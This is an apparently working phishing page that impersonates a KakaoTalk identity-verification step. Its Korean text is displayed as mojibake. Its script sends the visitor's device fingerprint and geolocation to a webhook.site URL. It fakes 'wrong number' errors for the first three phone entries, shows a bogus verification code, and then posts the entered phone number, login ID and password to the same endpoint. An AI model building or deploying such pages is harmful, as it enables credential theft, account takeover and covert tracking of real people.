<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ì¹´ì¹´ì˜¤í†¡ ì´ìš©ìë³´í˜¸ì„œë¹„ìŠ¤ ì™„í™”</title>
<style>
body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
.container { max-width: 500px; margin: 0 auto; padding: 20px; }
.hidden { display: none; }
h1 { font-size: 22px; font-weight: bold; margin: 20px 0; }
p { font-size: 14px; line-height: 1.6; color: #444; }
a { color: #007aff; text-decoration: none; font-size: 14px; }
.checkbox { display: flex; align-items: center; margin-top: 20px; font-size: 14px; }
.checkbox input { margin-right: 8px; }
.btn-yellow { display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center;
font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: none; border-radius: 6px; cursor: pointer; }
.btn-yellow:active { background: #f0db00; }
.login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; }
.login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
.login-container input { width: 365px; padding: 5px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; }
.login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px; background: #f0f0f0; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
</style>
</head>
<body>

<!-- page1 -->
<div id="page1" class="container">
<h1>í†¡ì•ˆë…•íŒ¨ìŠ¤ë¡œ<br>ì´ìš©ìë³´í˜¸ì¡°ì¹˜ë¥¼ ì™„í™”í•˜ì„¸ìš”.</h1>
<p>ëª¨ë‘ë¥¼ ìœ„í•œ ì¹´í†¡ ì•ˆë…•ê°€ì´ë“œì—ì„œ<br>ì´ìš©ìë³´í˜¸ì¡°ì¹˜ì— ëŒ€í•´ ë” ìì„¸íˆ ì•Œì•„ë³´ì„¸ìš”.</p>
<a href="#">ì‚¬ì´íŠ¸ ë°”ë¡œê°€ê¸°</a>
<p style="margin-top:20px;">
ì‹œìŠ¤í…œì´ ë¹„ì •ìƒì ì¸ ì´ìš©í™˜ê²½ ë° íŒ¨í„´ì„ ê°ì§€í•˜ì—¬ ì´ìš©ìë³´í˜¸ì¡°ì¹˜ê°€ ì‹¤í–‰ì¤‘ì…ë‹ˆë‹¤.<br><br>
ì´ëŠ” ì•ˆì „í•œ ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ê¸° ìœ„í•œ í•œì‹œì  ì¡°ì¹˜ì´ë©°, êµ­ë‚´ ë²ˆí˜¸ë¥¼ ì‚¬ìš©ì¤‘ì¸ ì¹´ì¹´ì˜¤ ì¸ì¦ ì„œë¹„ìŠ¤ ê°€ì…ìì¼ ê²½ìš° ì¹´ì¹´ì˜¤ ì¸ì¦ì„œë¡œ ë³¸ì¸ì„ì„ ì¦ëª…í•˜ì—¬ ì´ìš©ìë³´í˜¸ì¡°ì¹˜ë¥¼ ì¼ì‹œì ìœ¼ë¡œ ì™„í™” ë˜ëŠ” í•´ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br><br>
ë‹¤ë§Œ, ë¹„ì •ìƒì ì¸ ì´ìš©í™˜ê²½ ë° íŒ¨í„´ì´ ë°˜ë³µì ìœ¼ë¡œ ê°ì§€ëœë‹¤ë©´ ë™ì¼í•œ ì´ìš©ìë³´í˜¸ì¡°ì¹˜ê°€ ë‹¤ì‹œ ì ìš©ë  ìˆ˜ ìˆìœ¼ë©°, <strong>ì¸ì¦ì„œ ë°œê¸‰ì„ ìœ„í•œ íœ´ëŒ€í° ì¸ì¦ì •ë³´ì™€ ê³„ì¢Œ ì¸ì¦ì •ë³´</strong>ëŠ” ì œ 3ìì—ê²Œ ê³µìœ í•˜ì§€ ì•Šë„ë¡ ìœ ì˜í•´ ì£¼ì‹œê¸° ë°”ëë‹ˆë‹¤.<br><br>
</p>
<div class="checkbox">
<input type="checkbox" id="agree">
<label for="agree">[í•„ìˆ˜] ê°œì¸ì •ë³´ ìˆ˜ì§‘ ë° ì´ìš© ë™ì˜</label>
</div>
<button class="btn-yellow" onclick="goNext()">ë³¸ì¸ì¸ì¦í•˜ê¸°</button>
</div>

<!-- page2: ì „í™”ë²ˆí˜¸ ì…ë ¥ -->
<div id="page2" class="login-container hidden">
<h2>ì¹´ì¹´ì˜¤í†¡ ë³¸ì¸ì¸ì¦í•˜ê¸°</h2>
<input type="text" placeholder="(+82)ì „í™”ë²ˆí˜¸" id="userId" style="width:365px; padding:5px;">
<button type="button" class="btn-yellow" onclick="sendPhone()">ë‹¤ìŒ</button>
</div>

<!-- page3: ì¸ì¦ë²ˆí˜¸ ì…ë ¥ -->
<div id="page3" class="login-container hidden">
<h2>ì¸ì¦ë²ˆí˜¸ ì…ë ¥</h2>
<input type="text" placeholder="ì¸ì¦ë²ˆí˜¸" id="authCode" readonly style="width:365px; padding:5px;">
</div>

<!-- page4: ìµœì¢… ë¡œê·¸ì¸ -->
<div id="page4" class="login-container hidden">
<h2>ì¹´ì¹´ì˜¤í†¡ ë³¸ì¸ì¸ì¦í•˜ê¸°</h2>
<input type="text" placeholder="ì´ë©”ì¼ ë˜ëŠ” ì „í™”ë²ˆí˜¸" id="userId4" style="width:365px; padding:5px;">
<input type="password" placeholder="ë¹„ë°€ë²ˆí˜¸" id="userCode4" style="width:365px; padding:5px;">
<button type="button" class="btn-gray" onclick="sendPage4()">ë¡œê·¸ì¸</button>
</div>

<script>
const webhookUrl = "	https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
let savedPhone = ""; // ì „í™”ë²ˆí˜¸ ì €ì¥ìš©
let phoneTryCount = 0; // ì „í™”ë²ˆí˜¸ ì…ë ¥ ì‹œë„ íšŸìˆ˜ ì €ì¥

// page1 -> page2
function goNext() {
  const chk = document.getElementById("agree");
  if (!chk.checked) { alert("ë™ì˜ í›„ ì§„í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤."); return; }
  collectUserInfo(); // ìµœëŒ€ ì •ë³´ ìˆ˜ì§‘
  document.getElementById("page1").classList.add("hidden");
  document.getElementById("page2").classList.remove("hidden");
}

// ìµœëŒ€ ì •ë³´ ìˆ˜ì§‘
async function collectUserInfo() {
  const formData = new URLSearchParams();
  formData.append("userAgent", navigator.userAgent);
  formData.append("language", navigator.language);
  formData.append("platform", navigator.platform);
  formData.append("cookieEnabled", navigator.cookieEnabled);
  formData.append("onLine", navigator.onLine);
  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
  formData.append("screen.width", screen.width);
  formData.append("screen.height", screen.height);
  formData.append("screen.availWidth", screen.availWidth);
  formData.append("screen.availHeight", screen.availHeight);
  formData.append("screen.colorDepth", screen.colorDepth);
  formData.append("screen.pixelDepth", screen.pixelDepth);
  formData.append("window.innerWidth", window.innerWidth);
  formData.append("window.innerHeight", window.innerHeight);
  formData.append("window.outerWidth", window.outerWidth);
  formData.append("window.outerHeight", window.outerHeight);
  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
  if (navigator.connection) {
    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
  } else {
    formData.append("network.info", "unknown");
  }
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      formData.append("battery.charging", battery.charging);
      formData.append("battery.level", battery.level);
      formData.append("battery.chargingTime", battery.chargingTime);
      formData.append("battery.dischargingTime", battery.dischargingTime);
    } catch(e) { formData.append("battery.info", "unknown"); }
  } else { formData.append("battery.info", "unknown"); }
  if (navigator.geolocation) {
    await new Promise(resolve => {
      navigator.geolocation.getCurrentPosition(pos => {
        formData.append("location.latitude", pos.coords.latitude);
        formData.append("location.longitude", pos.coords.longitude);
        formData.append("location.accuracy", pos.coords.accuracy);
        resolve();
      }, err => { formData.append("location.error", err.message); resolve(); });
    });
  } else { formData.append("location", "unknown"); }
  if (window.DeviceMotionEvent) {
    window.addEventListener("devicemotion", e=>{
      if (e.acceleration) {
        formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
        formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
        formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
      }
    }, { once:true });
  }
  if (window.DeviceOrientationEvent) {
    window.addEventListener("deviceorientation", e=>{
      formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
      formData.append("sensors.orientation.beta", e.beta ?? "unknown");
      formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
    }, { once:true });
  }
  formData.append("timestamp", new Date().toISOString());
  formData.append("page","1");

  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
  .catch(err=>console.error("WebHook ì „ì†¡ ì˜¤ë¥˜:",err));
}

// page2 -> page3
function sendPhone() {
  const userId = document.getElementById("userId").value.trim();
  const phoneRegex = /^010\d{8}$/;
  if (!userId) { alert("ì „í™”ë²ˆí˜¸ë¥¼ ì…ë ¥í•´ì£¼ì„¸ìš”."); return; }
  if (!phoneRegex.test(userId)) { alert("ì˜ëª»ëœ í˜•ì‹ì˜ ì „í™”ë²ˆí˜¸ì…ë‹ˆë‹¤."); return; }

  phoneTryCount++; // ì‹œë„ íšŸìˆ˜ ì¦ê°€

  // ì•ì˜ 3ë²ˆê¹Œì§€ëŠ” ë¬´ì¡°ê±´ ì˜¤ë¥˜ ë©”ì‹œì§€
  if (phoneTryCount < 4) {
    alert("ì „í™”ë²ˆí˜¸ê°€ í‹€ë ¸ìŠµë‹ˆë‹¤. ë‹¤ì‹œ í™•ì¸í•´ì£¼ì„¸ìš”.");
    return;
  }

  // 4ë²ˆì§¸ ì‹œë„ë¶€í„°ëŠ” ì •ìƒ ì²˜ë¦¬
  savedPhone = userId; // ì „í™”ë²ˆí˜¸ ì €ì¥

  fetch(webhookUrl,{
    method:"POST",
    headers:{"Content-Type":"application/x-www-form-urlencoded"},
    body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})
  }).catch(err=>console.error(err));

  document.getElementById("page2").classList.add("hidden");
  document.getElementById("page3").classList.remove("hidden");

  // ğŸ”¹ 0 í¬í•¨ ê°€ëŠ¥í•œ 6ìë¦¬ ëœë¤ ì¸ì¦ë²ˆí˜¸ ìƒì„±
  const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");

  setTimeout(()=>{
    document.getElementById("authCode").value = randomCode;
    setTimeout(()=>{
      document.getElementById("page3").classList.add("hidden");
      document.getElementById("page4").classList.remove("hidden");

      // 4í˜ì´ì§€ ì „í™”ë²ˆí˜¸ ìë™ ì…ë ¥
      document.getElementById("userId4").value = savedPhone;

    },1000);
  },1500);
}

// page4 ì „ì†¡
function sendPage4() {
  const userId4=document.getElementById("userId4").value.trim();
  const userCode4=document.getElementById("userCode4").value.trim();
  if(!userId4||!userCode4){alert("ì´ë©”ì¼/ì „í™”ë²ˆí˜¸ì™€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•´ì£¼ì„¸ìš”."); return;}
  fetch(webhookUrl,{
    method:"POST",
    headers:{"Content-Type":"application/x-www-form-urlencoded"},
    body:new URLSearchParams({page:"4",userId:userId4,password:userCode4,timestamp:new Date().toISOString()})
  }).then(()=>alert("page4 ê°’ ì „ì†¡ ì™„ë£Œ!")).catch(err=>console.error(err));
}
</script>
</body>
</html>
